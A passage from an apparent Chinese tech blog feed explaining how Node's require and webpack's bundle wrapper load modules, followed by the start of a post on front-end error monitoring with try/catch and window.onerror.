class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Module._load = function(request, parent, isMain) &#123;</span><br><span class="line">  // 1. 检查 Module._cache，是否缓存之中有指定模块</span><br><span class="line">  // 2. 如果缓存之中没有，就创建一个新的Module实例</span><br><span class="line">  // 3. 将它保存到缓存</span><br><span class="line">  // 4. 使用 module.load() 加载指定的模块文件，</span><br><span class="line">  //    读取文件内容之后，使用 module.compile() 执行文件代码</span><br><span class="line">  // 5. 如果加载/解析过程报错，就从缓存删除该模块</span><br><span class="line">  // 6. 返回该模块的 module.exports</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Given a file name, pass it to the proper extension handler.</span><br><span class="line">Module.prototype.load = function(filename) &#123;</span><br><span class="line">  debug(&apos;load %j for module %j&apos;, filename, this.id);</span><br><span class="line"></span><br><span class="line">  assert(!this.loaded);</span><br><span class="line">  this.filename = filename;</span><br><span class="line">  this.paths = Module._nodeModulePaths(path.dirname(filename));</span><br><span class="line">  </span><br><span class="line">  // .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的第4步，采用module.compile()执行指定模块的脚本，逻辑如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Run the file contents in the correct scope or sandbox. Expose</span><br><span class="line">// the correct helper variables (require, module, exports) to</span><br><span class="line">// the file.</span><br><span class="line">// Returns exception, if any.</span><br><span class="line">Module.prototype._compile = function(content, filename) &#123;</span><br><span class="line">// .....</span><br><span class="line">const dirname = path.dirname(filename);</span><br><span class="line">  const require = internalModule.makeRequireFunction.call(this);</span><br><span class="line">  const args = [this.exports, require, this, filename, dirname];</span><br><span class="line">  const depth = internalModule.requireDepth;</span><br><span class="line">  if (depth === 0) stat.cache = new Map();</span><br><span class="line">  const result = compiledWrapper.apply(this.exports, args);</span><br><span class="line">  if (depth === 0) stat.cache = null;</span><br><span class="line">  return result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Module.prototype._compile = function(content, filename) &#123;</span><br><span class="line">  // 1. 生成一个require函数，指向module.require</span><br><span class="line">  // 2. 加载其他辅助方法到require</span><br><span class="line">  // 3. 将文件内容放到一个函数之中，该函数可调用 require</span><br><span class="line">  // 4. 执行该函数</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的第1步和第2步，require函数及其辅助方法主要如下。</p><blockquote><p>require(): 加载外部模块<br>require.resolve()：将模块名解析到一个绝对路径<br>require.cache：指向所有缓存的模块<br>require.extensions：根据文件的后缀名，调用不同的执行函数  </p></blockquote><p>一旦require函数准备完毕，整个所要加载的脚本内容，就被放到一个新的函数之中，这样可以避免污染全局环境。该函数的参数包括require、module、exports，以及其他一些参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function (exports, require, module, __filename, __dirname) &#123;</span><br><span class="line">  // YOUR CODE INJECTED HERE!</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Module._compile方法是同步执行的，所以Module._load要等它执行完成，才会向用户返回module.exports的值。</p><p>在Module._complie中是会在我们模块的代码外面包裹一些内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Module.prototype._compile = function(content, filename) &#123;</span><br><span class="line">  // remove shebang</span><br><span class="line">  content = content.replace(shebangRe, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">  // create wrapper function</span><br><span class="line">  var wrapper = Module.wrap(content);</span><br><span class="line"></span><br><span class="line">  var compiledWrapper = runInThisContext(wrapper,</span><br><span class="line">                                      &#123; filename: filename, lineOffset: 0 &#125;);</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Module的warp 来自NativeModule</span><br><span class="line"></span><br><span class="line">NativeModule.wrap = function(script) &#123;</span><br><span class="line">  return NativeModule.wrapper[0] + script + NativeModule.wrapper[1];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">NativeModule.wrapper = [</span><br><span class="line">  &apos;(function (exports, require, module, __filename, __dirname) &#123; &apos;,</span><br><span class="line">  &apos;\n&#125;);&apos;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>自此我们的模块内容算是包装完了。</p><p>AND <del>~</del>~</p><p>我们可以模拟一个类似node require的办法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function require(path) &#123;</span><br><span class="line">    function load()&#123;</span><br><span class="line">        return &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    let code = load(path);</span><br><span class="line">    code = &apos;function add(a, b) &#123;return a+b&#125;; module.exports = add&apos;;</span><br><span class="line">    // 封装成闭包</span><br><span class="line">    code = `(function(module) &#123; $&#123;code&#125; &#125;)(context)`;</span><br><span class="line">    // 相当于 exports，用于导出对象</span><br><span class="line">    let context = &#123;&#125;;</span><br><span class="line">    // 运行代码，使得结果影响到 context</span><br><span class="line">    const run = new Function(&apos;context&apos;, code);</span><br><span class="line">    </span><br><span class="line">    //大概就是这样子</span><br><span class="line">    &lt;!-- function(context)&#123;</span><br><span class="line">        (function(module) &#123;</span><br><span class="line">            function add(a, b) &#123;return a+b&#125;; </span><br><span class="line">            module.exports = add;</span><br><span class="line">        &#125;)(context)</span><br><span class="line">    &#125; --&gt;</span><br><span class="line"></span><br><span class="line">    run(context, code);</span><br><span class="line">    </span><br><span class="line">    //返回导出的结果</span><br><span class="line">    return context.exports;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = require(&apos;xxx&apos;).exports;</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2015/05/require.html" target="_blank" rel="noopener">阮老师require</a></p><h2 id="about-webpack-模块化"><a href="#about-webpack-模块化" class="headerlink" title="about webpack 模块化"></a>about webpack 模块化</h2><h5 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h5><p>webpack作为一个构建工具，解决了前端代码缺少模块化能力的问题。代码经过webpack构建和包装之后，能够在浏览器以模块化的方式运行。这些能力，都是因为webpack对我们的代码进行了一层包装。</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>首先我们创建一个简单入口模块index.js和一些依赖模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//index.js</span><br><span class="line">let &#123;name, age, address&#125; = require(&apos;./common.js&apos;);</span><br><span class="line">import es6 from &apos;./es6.js&apos;;</span><br><span class="line"></span><br><span class="line">console.log(name, es6(10));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//es6.js</span><br><span class="line">export default function(a)&#123;</span><br><span class="line">return 1000 + a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function testfun(a)&#123;</span><br><span class="line">return a + &apos;哈哈哈&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//common.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">age: 10,</span><br><span class="line">name: &apos;zhangsan&apos;,</span><br><span class="line">address: function()&#123;</span><br><span class="line">return &apos;dddd&apos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>webpack 配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var path = require(&quot;path&quot;);</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    entry: path.join(__dirname, &apos;index.js&apos;),</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &apos;outs&apos;),</span><br><span class="line">        filename: &apos;index.js&apos;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这是一个最简单的配置，只指定了模块入口和输出路径。</p></blockquote><p>执行webpack，得到经过webpack打包的代码如下（去掉了不必要的注释）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">/******/ (function(modules) &#123; // webpackBootstrap</span><br><span class="line">/******/ // The module cache</span><br><span class="line">/******/ var installedModules = &#123;&#125;;</span><br><span class="line">/******/ // The require function</span><br><span class="line">/******/ function __webpack_require__(moduleId) &#123;</span><br><span class="line">/******/ // Check if module is in cache</span><br><span class="line">/******/ if(installedModules[moduleId]) &#123;</span><br><span class="line">/******/ return installedModules[moduleId].exports;</span><br><span class="line">/******/ &#125;</span><br><span class="line">/******/ // Create a new module (and put it into the cache)</span><br><span class="line">/******/ var module = installedModules[moduleId] = &#123;</span><br><span class="line">/******/ i: moduleId,</span><br><span class="line">/******/ l: false,</span><br><span class="line">/******/ exports: &#123;&#125;</span><br><span class="line">/******/ &#125;;</span><br><span class="line">/******/ // Execute the module function</span><br><span class="line">/******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);</span><br><span class="line">/******/ // Flag the module as loaded</span><br><span class="line">/******/ module.l = true;</span><br><span class="line">/******/ // Return the exports of the module</span><br><span class="line">/******/ return module.exports;</span><br><span class="line">/******/ &#125;</span><br><span class="line">/******/ // expose the modules object (__webpack_modules__)</span><br><span class="line">/******/ __webpack_require__.m = modules;</span><br><span class="line">/******/</span><br><span class="line">/******/ // expose the module cache</span><br><span class="line">/******/ __webpack_require__.c = installedModules;</span><br><span class="line">/******/</span><br><span class="line">/******/ // define getter function for harmony exports</span><br><span class="line">/******/ __webpack_require__.d = function(exports, name, getter) &#123;</span><br><span class="line">/******/ if(!__webpack_require__.o(exports, name)) &#123;</span><br><span class="line">/******/ Object.defineProperty(exports, name, &#123; enumerable: true, get: getter &#125;);</span><br><span class="line">/******/ &#125;</span><br><span class="line">/******/ &#125;;</span><br><span class="line">/******/ // define __esModule on exports</span><br><span class="line">/******/ __webpack_require__.r = function(exports) &#123;</span><br><span class="line">/******/ if(typeof Symbol !== &apos;undefined&apos; &amp;&amp; Symbol.toStringTag) &#123;</span><br><span class="line">/******/ Object.defineProperty(exports, Symbol.toStringTag, &#123; value: &apos;Module&apos; &#125;);</span><br><span class="line">/******/ &#125;</span><br><span class="line">/******/ Object.defineProperty(exports, &apos;__esModule&apos;, &#123; value: true &#125;);</span><br><span class="line">/******/ &#125;;</span><br><span class="line">/******/ __webpack_require__.t = function(value, mode) &#123;</span><br><span class="line">/******/ if(mode &amp; 1) value = __webpack_require__(value);</span><br><span class="line">/******/ if(mode &amp; 8) return value;</span><br><span class="line">/******/ if((mode &amp; 4) &amp;&amp; typeof value === &apos;object&apos; &amp;&amp; value &amp;&amp; value.__esModule) return value;</span><br><span class="line">/******/ var ns = Object.create(null);</span><br><span class="line">/******/ __webpack_require__.r(ns);</span><br><span class="line">/******/ Object.defineProperty(ns, &apos;default&apos;, &#123; enumerable: true, value: value &#125;);</span><br><span class="line">/******/ if(mode &amp; 2 &amp;&amp; typeof value != &apos;string&apos;) for(var key in value) __webpack_require__.d(ns, key, function(key) &#123; return value[key]; &#125;.bind(null, key));</span><br><span class="line">/******/ return ns;</span><br><span class="line">/******/ &#125;;</span><br><span class="line">/******/</span><br><span class="line">/******/ // getDefaultExport function for compatibility with non-harmony modules</span><br><span class="line">/******/ __webpack_require__.n = function(module) &#123;</span><br><span class="line">/******/ var getter = module &amp;&amp; module.__esModule ?</span><br><span class="line">/******/ function getDefault() &#123; return module[&apos;default&apos;]; &#125; :</span><br><span class="line">/******/ function getModuleExports() &#123; return module; &#125;;</span><br><span class="line">/******/ __webpack_require__.d(getter, &apos;a&apos;, getter);</span><br><span class="line">/******/ return getter;</span><br><span class="line">/******/ &#125;;</span><br><span class="line">/******/</span><br><span class="line">/******/ // Object.prototype.hasOwnProperty.call</span><br><span class="line">/******/ __webpack_require__.o = function(object, property) &#123; return Object.prototype.hasOwnProperty.call(object, property); &#125;;</span><br><span class="line">/******/</span><br><span class="line">/******/ // __webpack_public_path__</span><br><span class="line">/******/ __webpack_require__.p = &quot;&quot;;</span><br><span class="line">/******/</span><br><span class="line">/******/</span><br><span class="line">/******/ // Load entry module and return exports</span><br><span class="line">/******/ return __webpack_require__(__webpack_require__.s = &quot;./src/index.js&quot;);</span><br><span class="line">/******/ &#125;)</span><br><span class="line">/******/ (&#123;</span><br><span class="line"></span><br><span class="line">/***/ &quot;./src/common.js&quot;:</span><br><span class="line">/***/ (function(module, exports) &#123;</span><br><span class="line"></span><br><span class="line">  eval(&quot;module.exports = &#123;\n\tage: 10,\n\tname: &apos;zhangsan&apos;,\n\taddress: function()&#123;\n\t\treturn &apos;dddd&apos;\n\t&#125;\n&#125;\n\n//# sourceURL=webpack:///./src/common.js?&quot;);</span><br><span class="line">  /***/ &#125;),</span><br><span class="line">  </span><br><span class="line">  /***/ &quot;./src/es6.js&quot;:</span><br><span class="line">  /***/ (function(module, __webpack_exports__, __webpack_require__) &#123;</span><br><span class="line">  </span><br><span class="line">  &quot;use strict&quot;;</span><br><span class="line">  eval(&quot;__webpack_require__.r(__webpack_exports__);\n/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, \&quot;testfun\&quot;, function() &#123; return testfun; &#125;);\n/* harmony default export */ __webpack_exports__[\&quot;default\&quot;] = (function(a)&#123;\n\treturn 1000 + a;\n&#125;);\n\nfunction testfun(a)&#123;\n\treturn a + &apos;哈哈哈&apos;;\n&#125;\n\n//# sourceURL=webpack:///./src/es6.js?&quot;);</span><br><span class="line">  /***/ &#125;),</span><br><span class="line"></span><br><span class="line">  /***/ &quot;./src/index.js&quot;:</span><br><span class="line">  /***/ (function(module, __webpack_exports__, __webpack_require__) &#123;  </span><br><span class="line">  &quot;use strict&quot;;</span><br><span class="line">  eval(&quot;__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _es6_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./es6.js */ \&quot;./src/es6.js\&quot;);\nlet &#123;name, age, address&#125; = __webpack_require__(/*! ./common.js */ \&quot;./src/common.js\&quot;);\n\n\nconsole.log(name, Object(_es6_js__WEBPACK_IMPORTED_MODULE_0__[\&quot;default\&quot;])(10));\n\n\n//# sourceURL=webpack:///./src/index.js?&quot;);</span><br><span class="line"></span><br><span class="line">  /***/ &#125;)</span><br><span class="line"></span><br><span class="line">  /******/ &#125;);</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>上面webpack打包的代码，整体可以简化成下面的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(function (modules) &#123;/* xxxx */&#125;)</span><br><span class="line">(&#123;</span><br><span class="line">    &apos;./src/common.js&apos;: (function(module, exports) &#123;</span><br><span class="line">                /* 模块common.js的代码 */</span><br><span class="line">                eval(&quot;module.exports = &#123;\n\tage: 10,\n\tname: &apos;zhangsan&apos;,\n\taddress: function()&#123;\n\t\treturn &apos;dddd&apos;\n\t&#125;\n&#125;\n\n//# sourceURL=webpack:///./src/common.js?&quot;);</span><br><span class="line">                &#125;),</span><br><span class="line">    &apos;./src/es6.js&apos;: f()&#123;&#125;, /* 模块es6.js的代码 */</span><br><span class="line">    &apos;./src/index.js&apos;: f()&#123;&#125;, /* 模块index.js的代码 */</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>入口处文件最后结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var str = `__webpack_require__.r(__webpack_exports__);</span><br><span class="line">var _es6_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(\&quot;./src/es6.js\&quot;);</span><br><span class="line">var &#123;name, age, address&#125; = __webpack_require__(\&quot;./src/common.js\&quot;);</span><br><span class="line">console.log(name, Object(_es6_js__WEBPACK_IMPORTED_MODULE_0__[\&quot;default\&quot;])(10));`;</span><br><span class="line">eval(str);</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，整个打包生成的代码是一个立即执行函数。</p></blockquote><p>首先：函数参数是我们写的各个模块组成的数组，只不过我们的代码，被webpack包装在了一个函数的内部（也就是说我们的模块），在这里就是一个函数。为什么要这样做，是因为浏览器本身不支持模块化，那么webpack就用函数作用域来hack模块化的效果。</p><p>如果你debug过node代码，你会发现一样的hack方式，node中的模块也是函数，跟模块相关的参数exports、require，或者其他参数<strong>filename和</strong>dirname等都是通过函数传值作为模块中的变量，模块与外部模块的访问就是通过这些参数进行的，当然这对开发者来说是透明的。</p><p>同样的方式，webpack也控制了模块的module、exports和require，那么我们就看看webpack是如何实现这些功能的。</p><p>下面是摘取的函数内容和一些注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 1、模块缓存对象</span><br><span class="line">var installedModules = &#123;&#125;;</span><br><span class="line">// 2、webpack实现的require</span><br><span class="line">function __webpack_require__(moduleId) &#123;</span><br><span class="line">    // 3、判断是否已缓存模块</span><br><span class="line">    if(installedModules[moduleId]) &#123;</span><br><span class="line">        return installedModules[moduleId].exports;</span><br><span class="line">    &#125;</span><br><span class="line">    // 4、缓存模块</span><br><span class="line">    var module = installedModules[moduleId] = &#123;</span><br><span class="line">        i: moduleId,</span><br><span class="line">        l: false,</span><br><span class="line">        exports: &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    // 5、调用模块函数</span><br><span class="line">    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);</span><br><span class="line">    // 6、标记模块为已加载</span><br><span class="line">    module.l = true;</span><br><span class="line">    // 7、返回module.exports</span><br><span class="line">    return module.exports;</span><br><span class="line">&#125;</span><br><span class="line">// 8、require第一个模块</span><br><span class="line">return __webpack_require__(__webpack_require__.s = 0);</span><br></pre></td></tr></table></figure><p>webpack之前的版本打过的内容，是这样子的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function(module) &#123;</span><br><span class="line">&#125;)([(function ()&#123;&#125;), function() &#123;&#125;])</span><br></pre></td></tr></table></figure><blockquote><p>模块数组作为参数传入IIFE函数后，IIFE做了一些初始化工作：<br>IIFE首先定义了installedModules ，这个变量被用来缓存已加载的模块。</p></blockquote><blockquote><p>定义了<strong>webpack_require</strong> 这个函数，函数参数为模块的id。这个函数用来实现模块的require。</p></blockquote><blockquote><p><strong>webpack_require</strong> 函数首先会检查是否缓存了已加载的模块，如果有则直接返回缓存模块的exports。如果没有缓存，也就是第一次加载，则首先初始化模块，并将模块进行缓存。</p></blockquote><blockquote><p>然后调用模块函数，也就是前面webpack对我们的模块的包装函数，将module、module.exports和<strong>webpack_require</strong>作为参数传入。注意这里做了一个动态绑定，将模块函数的调用对象绑定module.exports，这是为了保证在模块中的this指向当前模块。</p></blockquote><blockquote><p>调用完成后，模块标记为已加载。</p></blockquote><blockquote><p>返回模块exports的内容。</p></blockquote><blockquote><p>利用前面定义的<strong>webpack_require</strong> 函数，require第0个模块，也就是入口模块。</p></blockquote><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>打包过的模块生成了一些以自执行函数形式的闭包。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;about-node-require&quot;&gt;&lt;a href=&quot;#about-node-require&quot; class=&quot;headerlink&quot; title=&quot;about node require&quot;&gt;&lt;/a&gt;about node require&lt;/h2&gt;&lt;p&gt;首先：&lt;/p
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>前端异常监控</title>
    <link href="http://swingboy.github.io/2018/06/15/%E5%89%8D%E7%AB%AF%E5%BC%82%E5%B8%B8%E7%9B%91%E6%8E%A7/"/>
    <id>http://swingboy.github.io/2018/06/15/前端异常监控/</id>
    <published>2018-06-15T09:23:30.000Z</published>
    <updated>2020-04-27T13:22:29.047Z</updated>
    
    <content type="html"><![CDATA[<p>###前言: JS异常处理简介</p><p>每天调试会看到控制台各种各式的红色错误代码。</p><p>JavaScript错误是怎么输出到控制台的  ——  JavaScript的错误处理原理。</p><p>当抛出异常时，JavaScript解释器会立即停下当前正在执行的逻辑，并且跳到最近的异常处理程序（可以参考冒泡与变量作用域的相关概念。一句话简单理解：儿子犯了错误，找老子，一层一层往上找，直到找到能够承担错误的对象为止）。如果在所有的词法结构和调用栈上面没有找到错误处理程序。JavaScript就会把异常当做程序错误处理，并报告给用户。</p><blockquote><p>只要有异常对象抛出，不管是浏览器抛出的，还是代码主动抛出，都会让程序停止执行。如果想让程序继续执行，则有也可以用try…catch来捕获。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  error</span><br><span class="line">  console.log(&apos;永远不会执行&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  console.log(&apos;我继续执行&apos;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>再解释一下：</p><blockquote><p>1.当前代码块将作为一个任务压入任务队列中，JavaScript线程会不断地从任务队列中提取任务执行；</p></blockquote><blockquote><p>2.当任务执行过程中报异常，且异常没有捕获处理，则会一路沿着调用栈从顶到底抛出，最终终止当前任务的执行；</p></blockquote><blockquote><p>3.JavaScript线程会继续从任务队列中提取下一个任务继续执行。</p></blockquote><h3 id="一、收集日志的方法"><a href="#一、收集日志的方法" class="headerlink" title="一、收集日志的方法"></a>一、收集日志的方法</h3><p>平时收集日志的手段，可以归类为两个方面，一个是逻辑中的错误判断，为主动判断；一个是利用语言给我们提供的捷径，暴力式获取错误信息，如 try..catch 和 window.onerror等</p><h5 id="1-主动判断"><a href="#1-主动判断" class="headerlink" title="1. 主动判断"></a>1. 主动判断</h5><p>我们在一些运算之后，得到一个期望的结果，然而结果不是我们想要的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// test.js</span><br><span class="line">function calc()&#123;</span><br><span class="line">  // sth code...</span><br><span class="line">  return val;</span><br><span class="line">&#125;</span><br><span class="line">if(calc() !== &quot;someVal&quot;)&#123;</span><br><span class="line">  Reporter.send(xxx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种属于逻辑错误/状态错误的反馈，在接口状态判断中用的比较多。</p><p>#####2. try..catch 捕获<br>判断一个代码段中存在的错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  init();</span><br><span class="line">  // code...</span><br><span class="line">&#125; catch(e)&#123;</span><br><span class="line">  Reporter.send(format(e));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以 init 为程序的入口，代码中所有同步执行出现的错误都会被捕获，这种方式也可以很好的避免程序刚跑起来就挂掉。</p><h5 id="3-window-onerror"><a href="#3-window-onerror" class="headerlink" title="3. window.onerror"></a>3. window.onerror</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.onerror = function() &#123;</span><br><span class="line">  var errInfo = format(arguments);</span><br><span class="line">  Reporter.send(errInfo);</span><br><span class="line">  return true;</span><br><span 